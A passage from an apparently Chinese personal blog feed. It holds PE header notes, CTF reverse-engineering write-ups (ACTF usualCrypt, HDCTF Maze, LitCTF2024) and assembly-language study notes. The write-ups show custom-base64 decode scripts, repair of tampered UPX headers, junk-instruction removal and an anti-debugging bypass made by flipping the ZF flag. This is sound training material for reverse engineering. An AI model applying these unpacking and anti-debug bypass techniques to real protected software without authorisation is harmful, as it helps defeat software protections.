src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E6%A0%87%E5%87%86pe%E5%A4%B4.png" alt="pe标准pe头"></p><p>标准 PE 头的结构体形式</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%A0%87%E5%87%86pe%E5%A4%B4%E7%BB%93%E6%9E%84.png" alt="标准pe头结构"></p><p><strong>SizeOfOptionalHeader</strong>用来标识<strong>扩展 PE 头</strong>的大小</p><p>不修改的情况下是<strong>32 位是 0xE0</strong>，<strong>64 位是 0xF0</strong>.</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%A0%87%E5%87%86pe%E5%A4%B4%E4%B8%AD%E6%A0%87%E8%AF%86%E7%9A%84%E6%89%A9%E5%B1%95pe%E5%A4%B4%E5%A4%A7%E5%B0%8F.png" alt="标准pe头中标识的扩展pe头大小"></p><h6 id="PE-文件头可选部分（扩展-PE-头）-240-224-字节（64-位-32-位）"><a href="#PE-文件头可选部分（扩展-PE-头）-240-224-字节（64-位-32-位）" class="headerlink" title="PE 文件头可选部分（扩展 PE 头） 240&#x2F;224 字节（64 位&#x2F;32 位）"></a>PE 文件头可选部分（扩展 PE 头） 240&#x2F;224 字节（64 位&#x2F;32 位）</h6><p>（IMAGE_OPTIONAL_HEADER32 OptionalHeader)</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%89%A9%E5%B1%95PE%E5%A4%B4.png" alt="扩展PE头"></p><p>扩展 PE 头的结构体中有一个<strong>SizeOfHeaders</strong>（<strong>DOS 头+PE 文件头+节表按照文件对齐的大小</strong> ）和<strong>FileAlignment</strong>（<strong>文件对齐</strong>）</p><p>！！！<strong>SizeOfHeaders</strong>只能是<strong>FileAlignment</strong>的整倍数！！！</p><p>假设<strong>FileAlignment</strong>设为<strong>200</strong>，<strong>SizeOfHeaders</strong>有用数据只有<strong>350</strong>，但<strong>SizeOfHeaders</strong>的值只能是<strong>400</strong>，剩下的 50 可填写其他数据来补全</p><p><strong>文件对齐大小</strong>：</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/PE%E6%96%87%E4%BB%B6%E5%AF%B9%E9%BD%90%E5%80%BC.png" alt="PE文件对齐值"></p><p>图中是 00 20 转换成 16 进制是 0x0200</p><p>所以<strong>FileAlignment</strong>的值是 200</p><p><strong>头大小：</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe_%E5%A4%B4%E5%A4%A7%E5%B0%8F.png" alt="pe_头大小"></p><p>00 06 转换成 16 进制是 0x0600</p><p>所以在 0x600 之后是<strong>节</strong>的数据、</p><p><strong>内存对齐大小</strong>：</p><p><strong>FileAlignment</strong>的前面是<strong>SelectionAlignment</strong>（<strong>内存对齐</strong>）</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%8C%89%E7%85%A7%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90.png" alt="按照内存对齐"></p><p><strong>红色</strong>部分是之前的<strong>文件对齐大小</strong></p><p>前面的<strong>蓝色</strong>就是<strong>内存对齐大小</strong></p><p>每个节中的数据同，但是对齐方式不同</p><p>多出的内存空间由 0 来补充</p><p>蓝色部分是 0x1000</p><h5 id="节表部分"><a href="#节表部分" class="headerlink" title="节表部分"></a>节表部分</h5><p>IMAGE_SECTION_HEADER 40 字节</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E8%8A%82%E8%A1%A8%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="节表结构体"></p><p>节表中的数据有很多个，图中就有 10 组，剩下的是编译器插入的数据</p><p>节表中的每个部分都由 36 个字节组成</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E8%8A%82%E8%A1%A8.jpg" alt="节表"></p><h5 id="节部分"><a href="#节部分" class="headerlink" title="节部分"></a>节部分</h5><p>每个节所占的空间也都是<strong>按照文件对齐</strong>和<strong>按照内存对齐</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu[ACTF新生赛2020]usualCrypt</title>
      <link href="/2024/06/04/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/"/>
      <url>/2024/06/04/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h1><p>打开main函数</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530175759195.png" alt="image-20240530175759195"></p><p>查看sub_401080</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530175917912.png" alt="image-20240530175917912"></p><p>发现是base64加密</p><p>跟进sub_401000</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530175951159.png" alt="image-20240530175951159"></p><p>发现是将base64的序列码改变了</p><p>回到上一级查看sub_401030</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530180043233.png" alt="image-20240530180043233"></p><p>这是一个大小写切换程序</p><p>回到main函数查看aZmxhz3tignxlxj</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530180237393.png" alt="image-20240530180237393"></p><p>这是加密后的字符串</p><p>所以只要将这个字符串的大小写切换并且用魔改的base64解密就得到了flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string=<span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase()<span class="comment">#大小写转换</span></span><br><span class="line">tables64=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><span class="comment">#原来的base64表</span></span><br><span class="line">newtable=<span class="string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><span class="comment">#现在表</span></span><br><span class="line">maketrans=<span class="built_in">str</span>.maketrans(newtable,tables64)<span class="comment">#不会，记住吧，铁子们</span></span><br><span class="line">translate=string.translate(maketrans)</span><br><span class="line">flag=base64.b64decode(string.translate(<span class="built_in">str</span>.maketrans(newtable,tables64)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu[HDCTF]MAZE</title>
      <link href="/2024/06/04/%5BHDCTF2019%5DMaze/"/>
      <url>/2024/06/04/%5BHDCTF2019%5DMaze/</url>
      
        <content type="html"><![CDATA[<h2 id="HDCTF2019-Maze4"><a href="#HDCTF2019-Maze4" class="headerlink" title="[HDCTF2019]Maze4"></a>[HDCTF2019]Maze4</h2><p>这个题主要是学习花指令的去除，迷宫并不难</p><p>不过在使用upx去壳前需要把文件名中的空格去除，否则会脱壳失败</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze01.png" alt="hdmaze01"></p><p>（花指令的有关内容相关请看以下文章）</p><p><a href="https://bbs.kanxue.com/thread-279604.htm">https://bbs.kanxue.com/thread-279604.htm</a></p><p><a href="https://blog.csdn.net/abel_big_xu/article/details/117927674">https://blog.csdn.net/abel_big_xu/article/details/117927674</a></p><p><a href="https://blog.csdn.net/m0_46296905/article/details/117336574">https://blog.csdn.net/m0_46296905/article/details/117336574</a></p><p>然后拖入ida中发现有花指令</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze02.png" alt="hdmaze02"></p><p>摁u转换成二进制</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze03.png" alt="hdmaze03"></p><p>摁c重新分析为代码</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze04.png" alt="hdmaze04"></p><p>选定全部的红色地址摁p进行生成函数</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze05.png" alt="hdmaze05"></p><p>这时main函数就被解出来了然后进入点击f5</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze06.png" alt="hdmaze06"></p><p>asc_408078和dword_40807c只要放在哪就行,</p><p>但是w（上）s（下）a（左）d（右）考虑的就比较多了</p><p>shift+f12查看字符串表找到迷宫地图</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze07.png" alt="hdmaze07"></p><p>长度是70个字符，可能是7*10或者10*7（建议去一些编程环境内进行排列，有字符自动对齐）</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze08.png" alt="hdmaze08"></p><p>flag就是通关迷宫时键盘的输入</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024逆向wp</title>
      <link href="/2024/06/03/litctf24%EF%BC%88%E9%83%BD%E6%98%AF%E8%80%BB%E8%BE%B1%EF%BC%89/"/>
      <url>/2024/06/03/litctf24%EF%BC%88%E9%83%BD%E6%98%AF%E8%80%BB%E8%BE%B1%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="litctf24（都是耻辱）"><a href="#litctf24（都是耻辱）" class="headerlink" title="litctf24（都是耻辱）"></a>litctf24（都是耻辱）</h1><h2 id="RUNMRE"><a href="#RUNMRE" class="headerlink" title="RUNMRE"></a>RUNMRE</h2><p>无壳，拿查看shift+F12</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/runme01.png" alt="runme01"></p><p>第一行是base64加密后的字符串</p><p>第二行是魔改后的base表</p><p>&#x3D;&#x3D;这是原表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&#x3D;</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/runme02.png" alt="runme02"></p><h2 id="ezpython（与三个python的环境默认缠斗一上午）"><a href="#ezpython（与三个python的环境默认缠斗一上午）" class="headerlink" title="ezpython（与三个python的环境默认缠斗一上午）"></a>ezpython（与三个python的环境默认缠斗一上午）</h2><p>python打包成的exe我们要用pyinstxtractor.py来进行解包</p><p>解完包我们将ezpy.pyc扔进在线网站中反编译成.py</p><p>（反编译网站<a href="https://www.lddgo.net/string/pyc-compile-decompile%EF%BC%89">https://www.lddgo.net/string/pyc-compile-decompile）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Litctfbase64</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;flag:&#x27;</span>)</span><br><span class="line">flag = Litctfbase64.b64decode(flag)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">&#x27;X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZog4==&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后我们去解包后产生的文件夹的PYZ-00.pyz_extracted文件夹找到Litctfbase64.pyc</p><p>同上诉步骤进行反编译成.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">BASE64_ALPHABET = <span class="string">&#x27;8kuWYm=1JiUPs7DT4x+X5tcqZKfGvA0gFLB6y3QbV2rNOlRdMwnEohjzSe9/HIa-&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">from_base64</span>(<span class="params">base64_string</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获得了base64的魔改表</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezpy01.png" alt="ezpy01"></p><h2 id="hello-upx-你是真的逆天"><a href="#hello-upx-你是真的逆天" class="headerlink" title="hello_upx(你是真的逆天)"></a>hello_upx(你是真的逆天)</h2><p>既然是upx就进行脱壳,但是会有报错提示被hacked</p><p>用010打开乍看没有问题,实际上出题人吧**&#x3D;&#x3D;UPX&#x3D;&#x3D;<strong>替换成了小写的</strong>upx**</p><p>于是我们将upx改正为UPX然后再脱壳拖入ida中查看main函数</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/hello_upx02.png" alt="hello_upx02"></p><p>v4和v5共同组成一个小端序</p><p>当v4[i]&#x3D;v6[i]-i时输出good</p><p>所以脚本为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> =[<span class="number">0x4C</span>,<span class="number">0x68</span>,<span class="number">0x72</span>,<span class="number">0x40</span>,<span class="number">0x50</span>,<span class="number">0x41</span>,<span class="number">0x75</span>,<span class="number">0x70</span>,<span class="number">0x2B</span>,<span class="number">0x63</span>,<span class="number">0x59</span>,<span class="number">0x25</span>,<span class="number">0x61</span>,<span class="number">0x58</span>,<span class="number">0x51</span>,<span class="number">0x65</span>,<span class="number">0x20</span>,<span class="number">0x4E</span>,<span class="number">0x5A</span>,<span class="number">0x1E</span>,<span class="number">0x60</span>,<span class="number">0x4E</span>,<span class="number">0x5E</span>,<span class="number">0x4F</span>,<span class="number">0x65</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">str</span>[i] + i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ezRC4"><a href="#ezRC4" class="headerlink" title="ezRC4"></a>ezRC4</h2><p>直接动调会闪退，main0有个反调试程序我们需要在这里打个断点</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc405.png" alt="ezrc405"></p><p>然后在上面调成这样进行单步调试（f7）</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc401.jpg" alt="ezrc401"></p><p>进入调试后在进到这一步时我们需要将ZF的值改成1然后进入到<strong>真</strong>模块否则就会自动退出</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc401.png" alt="ezrc401"></p><p>f7单步进入</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc404.png" alt="ezrc404"></p><p>到这里时发现我们之前在静态函数里发现的key</p><p>第二个块是对key进行解密</p><p>解密后的key为</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc403.png" alt="ezrc403"></p><p>然后根据前面静态的main函数中的buf1</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc402.png" alt="ezrc402"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/rc406.png" alt="rc406"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/2024/05/21/%E6%B1%87%E7%BC%96/"/>
      <url>/2024/05/21/%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="第一章基础知识"><a href="#第一章基础知识" class="headerlink" title="第一章基础知识"></a>第一章基础知识</h2><h4 id="汇编语言的组成："><a href="#汇编语言的组成：" class="headerlink" title="汇编语言的组成："></a>汇编语言的组成：</h4><p>&#x3D;&#x3D;1.汇编指令（核心）&#x3D;&#x3D;：机器码的助记符，有对应的机器码。</p><p>2.伪指令：没有对应的机器码，由编译器<em><strong>执行</strong></em>，计算机并不执行。</p><p>3.其他符号：如+、-、*、&#x2F;等，由编译器 <em><strong>识别</strong></em>，没有对应的机器码。。</p><h4 id="储存单元："><a href="#储存单元：" class="headerlink" title="储存单元："></a>储存单元：</h4><p>&#x3D;&#x3D;n位的cpu，<strong>一个字</strong>就有<strong>（n&#x2F;8）个字节</strong>&#x3D;&#x3D;（这应该是第二章的内容，但是我觉得首先要把单位分清楚就放在这里了）</p><p>&#x3D;&#x3D;<strong>Byte</strong>（储存单元&#x2F;字节）简写 <strong>B</strong>&#x3D;&#x3D;</p><p><strong>1KB&#x3D;1024B1MB&#x3D;1024KB1GB&#x3D;1024MB1TB&#x3D;1024GB</strong></p><p><strong>1024 &#x3D; 10^10</strong></p><p>计算机最小单位是<strong>bit（比特）</strong>如果一个计算机有<strong>128</strong>个<strong>储存单元</strong>，<strong>编号从0~127</strong></p><p><img src="/2024/05/21/%E6%B1%87%E7%BC%96/Users\admin\Desktop\微信图片_20231119201725.png" alt="微信图片_20231119201725"></p><h4 id="cpu对储存器都读写"><a href="#cpu对储存器都读写" class="headerlink" title="cpu对储存器都读写"></a>cpu对储存器都读写</h4><p>CPU 要想进行数据的读写，必须和外部器件(标准的说法是芯片)进行下面 3类信息的交互。<br><strong>1.存储单元的地址(地址信息);</strong><br><strong>2.器件的选择，读或写的命令(控制信息);</strong><br><strong>3.读或写的数据(数据信息)。</strong></p><p>CPU 是通过**&#x3D;&#x3D;总线&#x3D;&#x3D;**将地址、数据和控制信息传到存储器芯片中的</p><p>**&#x3D;&#x3D;总线&#x3D;&#x3D;<strong>是计算机中专门连接CPU 和其他芯片的导线。从物理上来讲，就是一根根导线的集合。根据传送信息的不同，总线从逻辑上又分为3 类，</strong>&#x3D;&#x3D;地址总线&#x3D;&#x3D;<strong>、&#x3D;&#x3D;<strong>控制总线</strong>&#x3D;&#x3D;和</strong>&#x3D;&#x3D;数据总线&#x3D;&#x3D;**。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120152544401.png" alt="image-20231120152544401"></p><p>(1)CPU 通过地址线将地址信息3 发出。</p><p>(2)CPU 通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。</p><p>(3)存储器将3号单元中的数据8通过数据线送入CPU。</p><h4 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h4><p>一个CPU有<strong>N根地址线</strong>，则可以说这个 CPU 的<strong>地址总线的&#x3D;&#x3D;宽度&#x3D;&#x3D;为 N</strong>。这样的 CPU最多可以寻找<strong>2的N 次方</strong>个内存单元。<strong>最小数是0，最大数是(2^n)-1</strong></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120153933375.png" alt="image-20231120153933375"></p><p>图1.4展示了一个具有 1根地址线的CPU向内存发出地址信息11时 10根地址线上传送的二进制信息。</p><h4 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h4><p>CPU 与内存或其他器件之间的<strong>数据传送</strong>是通过<strong>数据总线</strong>来进行的。<em><em>数据总线的&#x3D;&#x3D;宽度&#x3D;&#x3D;<strong>决定了 <em><strong>CPU</strong></em> 和</strong></em>外界的数据</em><strong><strong>&#x3D;&#x3D;传送速度&#x3D;&#x3D;<strong>。</strong>8</strong> 根数据总线一次可传送<strong>一个</strong> <em><strong>&#x3D;&#x3D;字节&#x3D;&#x3D;</strong></em>(字节是8进制数据)。**16</strong> 根数据总线一次可传送<strong>两个字节</strong>。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120154658074.png" alt="image-20231120154658074"></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120154746520.png" alt="image-20231120154746520"></p><h4 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h4><p>CPU 对外部器件的控制是通过<strong>控制总线</strong>来进行的。在这里控制总线是个总称，<strong>控制总线是一些不同控制线的集合</strong>。有多少根控制总线，就意味着 CPU 提供了对外部器件的多少种控制。所以，**&#x3D;&#x3D;控制总线的宽度决定了 CPU 对外部器件的控制能力。&#x3D;&#x3D;**<br>前面所讲的内存<strong>读或写</strong>命令是由<strong>几根控制线综合发出</strong>的，其中有一根称为<strong>“读信号输出”</strong>的<strong>控制线</strong>负责<strong>由 CPU 向外传送读信号</strong>，CPU 向该控制线上输出<strong>低电平表示将要读取数据</strong>:有一根称为“<strong>写信号输出”的控制线</strong>则负责<strong>传送写信号</strong>。</p><h4 id="内存地址空间-概述"><a href="#内存地址空间-概述" class="headerlink" title="内存地址空间(概述)"></a>内存地址空间(概述)</h4><p>什么是内存地址空间呢?举例来讲，一个 CPU 的地址总线宽度为 10，那么可以寻址1024 个内存单元，**&#x3D;&#x3D;这 1024 个可寻到的内存单元就构成这个CPU的内存地址空间&#x3D;&#x3D;**。</p><h4 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h4><p>在每一台 PC 机中，都有一个主板，<strong>主板上有核心器件和一些主要器件</strong>，<strong>这些器件通过总线(地址总线、数据总线、控制总线)相连</strong>。这些器件有 <strong>CPU、存储器、外围芯片组、扩展插槽等</strong>。<strong>扩展插槽上一般插有 RAM内存条和各类接口卡</strong>。</p><h4 id="接口卡"><a href="#接口卡" class="headerlink" title="接口卡"></a>接口卡</h4><p>计算机系统中，所有可用程序控制其工作的设备，必须受到 CPU 的控制。CPU 对外部设备都不能直接控制，如显示器、音箱、打印机等。直接控制这些设备进行工作的是插在扩展插槽上的接口卡。<strong>扩展插槽&#x3D;&#x3D;通过总线&#x3D;&#x3D;和 &#x3D;&#x3D;CPU&#x3D;&#x3D; 相连，所以&#x3D;&#x3D;接卡也通过总线同 CPU&#x3D;&#x3D;相连</strong>。CPU 可以直接控制这些接口卡，从而实现 CPU 对外设的间接控制。*&#x3D;&#x3D;<strong>简单地讲，就是CPU通过总线向接口卡发送命令，接口卡根据CPU的命令控制外设进行工作。</strong>&#x3D;&#x3D;*</p><p><strong>各类存储器芯片</strong></p><p>分为<strong>ROM（只读储存器）</strong>与<strong>RAM（随机储存器）</strong></p><p><strong>随机存储器</strong><br>用于存放供CPU使用的绝大部分程序和数据，主随机存储器一般由两个位置上的RAM 组成，<strong>装在主板上 RAM 和插在扩展插槽上的RAM。</strong></p><p><strong>装有BIOS(BasicInput&#x2F;Output System，基本输入&#x2F;输出系统)的ROM</strong></p><p>BIOS 是由主板和各类接口卡(如显卡、网卡等)厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上插有存储相应BIOS的ROM。</p><p><strong>接口卡上的 RAM</strong><br>某些接口卡需要对大批量输入、输出数据进行暂时存储，在其上装有 RAM。<strong>最典型的是显示卡上的 RAM，一般称为显存。显示卡随时将显存中的数据向显示器上输出。</strong>换句话说，我们将需要显示的内容写入显存，就会出现在显示器上。<img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121102521329.png" alt="image-20231121102521329"></p><h4 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121102715622.png" alt="image-20231121102715622"></p><p>在图 1.8中，所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器，<strong>每个物理存储器在这个逻辑存储器中占有一个地址段，&#x3D;&#x3D;即一段地址空间&#x3D;&#x3D;<strong>。</strong>&#x3D;&#x3D;CPU 在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。&#x3D;&#x3D;</strong></p><h2 id="第二章寄存器-你猜他为什么会有个“寄”（）"><a href="#第二章寄存器-你猜他为什么会有个“寄”（）" class="headerlink" title="第二章寄存器&#x2F;&#x2F;你猜他为什么会有个“寄”（）"></a>第二章寄存器&#x2F;&#x2F;你猜他为什么会有个“寄”（）</h2><p>在cpu中<strong>寄存器进行信息储存</strong></p><p><strong>不同的 CPU，寄存器的个数、结构是不相同的</strong>。8086CPU 有14 个寄存器，每个寄存器有一个名称。这些寄存器是: AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。</p><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>8086CPU 的所有寄存器都是 16 位的，可以存放两个字节。AX、BX、CX、DX这4个寄存器通常用来存放一般性的数据，被称为通用寄存器。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121104928194.png" alt="image-20231121104928194"></p><p><strong>8086CPU的上一代 CPU 中的寄存器都是 8位的</strong>，为了保证兼容，使原来基于上代CPU编写的程序稍加修改就可以运行在 8086之上，<strong>8086CPU的AX、BX、CX、DX这4个寄存器都可分为两个可独立使用的8位寄存器来用:</strong></p><p><strong>AX</strong> 可分为<strong>AH</strong>和<strong>AL;</strong><br><strong>BX</strong>可分为<strong>BH</strong>和<strong>BL</strong>;<br><strong>CX</strong>可分为<strong>CH</strong>和<strong>CL</strong>;<br><strong>DX</strong>可分为 <strong>DH</strong>和<strong>DL</strong></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121105907995.png" alt="image-20231121105907995"></p><p>AX的低8位(0位<del>7位)构成了AL寄存器，存器高8位(8位</del>15位)构成了AH寄存器。AH 和AL 寄存器是可以独立使用的 8 位存器。<img src="/../AppData/Roaming/Typora/typora-user-images/image-20231121110012138.png" alt="image-20231121110012138"></p><h4 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="&#x3D;&#x3D;几条汇编指令&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;几条汇编指令&#x3D;&#x3D;</strong></h4><p><em><strong>mov与add</strong></em></p><table><thead><tr><th>汇编指令</th><th>控制CPU完成的操作</th><th>用高级语言的语法描述</th></tr></thead><tbody><tr><td>mov ax,18</td><td><strong>将18送入寄存器AX</strong></td><td>AX&#x3D;18</td></tr><tr><td>mov ah,78</td><td><strong>将78送入寄存器AH</strong></td><td>AH&#x3D;78</td></tr><tr><td>add ax,8</td><td><strong>将寄存器AX中的数值加上8</strong></td><td>AX&#x3D;AX+8</td></tr><tr><td>mov ax,bx</td><td><strong>将寄存器BX中的数据送入寄存器AX</strong></td><td>AX-BX</td></tr><tr><td>add ax,bx</td><td><strong>将AX和BX中的数值相加，结果存在AX中</strong></td><td>AX-AX+BX</td></tr></tbody></table><p><strong>在进行数据传送或运算时，要注意指令的&#x3D;&#x3D;两个操作对象的位数应当是一致的&#x3D;&#x3D;</strong></p><h4 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h4><p>CPU 访问内存单元时，要<strong>给出内存单元的地址</strong>。所有的内存单元构成的存储空间是一个一维的线性空间，<strong>每一个内存单元在这个空间中都有唯一的地址</strong>，我们将这个<strong>唯一的地址</strong>称为<strong>物理地址。</strong><br><strong>CPU 通过地址总线送入存储器的，必须是一个内存单元的物理地址</strong>。在 CPU 向地址总线上发出物理地址之前，<strong>必须要在内部先形成这个物理地址</strong>。不同的 CPU 可以有不同的形成物理地址的方式。我们现在讨论 8086CPU 是如何在内部形成内存单元的物理地址的。</p><h4 id="16位结构cpu（典型8086）"><a href="#16位结构cpu（典型8086）" class="headerlink" title="16位结构cpu（典型8086）"></a>16位结构cpu（典型8086）</h4><p><strong>概括地讲，16 位结构(<strong>16 位机、字长为 16 位等常见说法，与 16 